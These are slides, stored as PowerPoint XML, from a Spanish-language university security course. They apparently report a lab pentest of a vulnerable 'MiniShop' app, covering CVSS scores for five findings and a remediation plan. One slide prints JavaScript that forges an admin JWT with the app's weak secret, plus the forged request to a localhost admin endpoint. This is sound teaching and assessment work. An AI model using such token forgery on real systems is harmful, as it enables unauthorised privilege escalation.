          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="50292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Panel Admin — destino de la escalación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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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2" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Evidencia JWT: Token Forjado via DevTools</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Web Crypto API — forja de JWT HS256 con role=Admin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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="384120"/>
            <a:ext cx="3200040" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF66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7" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="40248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⚠ PLACEHOLDER — Reemplazar con Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="128016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Paso 1: Forjar token con Web Crypto API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Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1645920"/>
            <a:ext cx="5486040" cy="2559960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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0" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1737360"/>
            <a:ext cx="521172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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>// JavaScript ejecutado en DevTools Console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const secret = 'MiniShopLab2026';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const keyBytes = new Uint8Array(32);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keyBytes.set(new TextEncoder().encode(secret));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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>// Zero-padded to 32 bytes (como hace el server)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const payload = {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  sub: '999',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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  unique_name: 'hacker',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  role: 'Admin',  // ← ESCALACIÓN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  iss: 'MiniShopLab',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  aud: 'MiniShopLab'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};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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="128016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Paso 2: GET /api/admin con token forjado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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1645920"/>
            <a:ext cx="5486040" cy="2559960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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3" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1737360"/>
            <a:ext cx="521172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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t># Request #9 — Forged JWT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GET /api/admin HTTP/1.1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Authorization: Bearer eyJhbGciOiJIUzI1NiI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  sInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLC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  J1bmlxdWVfbmFtZSI6ImhhY2...[FORGED]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Host: 127.0.0.1:5081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HTTP/1.1 200 OK  ← ACCESO ADMIN CONCEDIDO!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Content-Type: application/json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8F8F2"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Server: Kestrel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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Duration: 39ms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00" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF5555"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>→ {users:[6 cuentas], products:[4], orders:[2]}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Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4572000"/>
            <a:ext cx="11246760" cy="1188360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C0392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5" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4663440"/>
            <a:ext cx="10515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📊 Comparación (equiv. Burp Suite Repeater — token manipulation)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Con cookie (cliente-xss, role=Cliente):  GET /api/admin → 200 OK (BOLA via cookie)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Con JWT forjado (role=Admin, sub=999):   GET /api/admin → 200 OK (Admin completo)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1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→ Token forjado con secreto débil acepta role=Admin para usuario ficticio 'hacker'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Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="594360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6600"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Repeater en la entrega final.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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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8" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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9" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Resumen de Puntuaciones CVSS v3.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evaluación de severidad de los 5 hallazgos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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1463040"/>
            <a:ext cx="1124676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EE2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3" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="1005480" cy="639720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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="1005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9.6</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1920240"/>
            <a:ext cx="10054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CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="155448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VULN-05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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="187452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JWT HS256 Weak Secret</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="1737360"/>
            <a:ext cx="4571640" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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9" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="1737360"/>
            <a:ext cx="4388760" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C039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0" name="Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2423160"/>
            <a:ext cx="1124676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EE2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1" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2514600"/>
            <a:ext cx="1005480" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667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Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2514600"/>
            <a:ext cx="1005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8.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2880360"/>
            <a:ext cx="10054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HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="251460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VULN-03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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="283464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IDOR/BOLA Carrito/Pedidos</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2697480"/>
            <a:ext cx="4571640" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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7" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2697480"/>
            <a:ext cx="3702960" cy="27396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8" name="Rounded Rectangle 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3383280"/>
            <a:ext cx="1124676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EE2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9" name="Rounded Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3474720"/>
            <a:ext cx="1005480" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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Box 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3474720"/>
            <a:ext cx="1005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6.8</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3840480"/>
            <a:ext cx="10054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MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="347472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VULN-02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Box 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="379476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XSS Almacenado + Cookie</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="3657600"/>
            <a:ext cx="4571640" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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5" name="Rectangle 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="3657600"/>
            <a:ext cx="3108600" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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6" name="Rounded Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4343400"/>
            <a:ext cx="1124676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EE2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7" name="Rounded Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="1005480" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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Box 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="1005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5.3</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4800600"/>
            <a:ext cx="10054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MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="443484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VULN-01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Box 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="475488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SQLi Blind Time-Based</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="4617720"/>
            <a:ext cx="4571640" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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3" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="4617720"/>
            <a:ext cx="2422800" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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4" name="Rounded Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5303520"/>
            <a:ext cx="1124676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EE2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5" name="Rounded Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5394960"/>
            <a:ext cx="1005480" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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6" name="TextBox 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5394960"/>
            <a:ext cx="1005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5.3</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5760720"/>
            <a:ext cx="10054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MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="539496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VULN-04</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="571500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Auth Débil (Enum + Brute)</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="5577840"/>
            <a:ext cx="4571640" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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1" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="5577840"/>
            <a:ext cx="2422800" cy="273960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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2" name="Rounded Rectangle 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="630936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3" name="TextBox 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="635508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CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rounded Rectangle 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="630936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5" name="TextBox 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="635508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HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rounded Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="6309360"/>
            <a:ext cx="2742840" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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7" name="TextBox 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="635508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 MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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9" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Demo de la Aplicación — UNAPEC Mini Shop</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Capturas de las principales pantallas del sistema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3" name="Picture 6" descr="03-catalog-loggedin.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="5303160" cy="29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4" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3474720"/>
            <a:ext cx="5303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Catálogo autenticado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5" name="Picture 8" descr="04-profile-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1371600"/>
            <a:ext cx="5303160" cy="29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6" name="TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="3474720"/>
            <a:ext cx="5303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Perfil de usuario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7" name="Picture 10" descr="08-admin-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="5303160" cy="29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8" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6035040"/>
            <a:ext cx="5303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Panel de administración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9" name="Picture 12" descr="09-seller-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="3931920"/>
            <a:ext cx="5303160" cy="29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0" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="6035040"/>
            <a:ext cx="5303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Panel del vendedor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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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2" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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3" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Conclusiones y Recomendaciones</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fase 2: Blue Team — Remediaciones propuestas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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="5486040" cy="5028840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F6F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7" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="146304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27AE60"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✅ Fase 1 Completada</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1920240"/>
            <a:ext cx="502884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• 10 amenazas STRIDE identificadas y validadas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• 5 vulnerabilidades demostradas con evidencia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• DFD validado contra la aplicación real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• CVSS v3.1 calculado para cada hallazgo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• Evidencia DevTools como base para Burp Suite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📊 Distribución de severidad:</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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C0392B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1 vulnerabilidad CRITICAL (CVSS 9.6)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E67E22"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1 vulnerabilidad HIGH (CVSS 8.1)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F39C12"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3 vulnerabilidades MEDIUM (CVSS 5.3-6.8)</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1371600"/>
            <a:ext cx="5303160" cy="5028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33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0" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="1463040"/>
            <a:ext cx="475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🔧 Plan de Remediación Fase 2</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="1920240"/>
            <a:ext cx="4754520" cy="438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P1: Migrar JWT a RS256 con par de llaves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→ Elimina forja de tokens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P1: Validar ownership en carrito/pedidos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→ Elimina IDOR/BOLA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P2: Sanitizar comentarios + CSP + HttpOnly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→ Elimina XSS almacenado y robo de cookie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P2: Parametrizar consultas SQL (EF Core)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→ Elimina SQLi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P3: Rate limiting con Redis + lockout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→ Mitiga fuerza bruta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P3: Mensaje uniforme en login + bcrypt + TOTP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→ Elimina enumeración, fortalece autenticación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s-DO" sz="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100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>P3: Tabla de auditoría</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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→ Trazabilidad de acciones</a:t>
            </a:r>
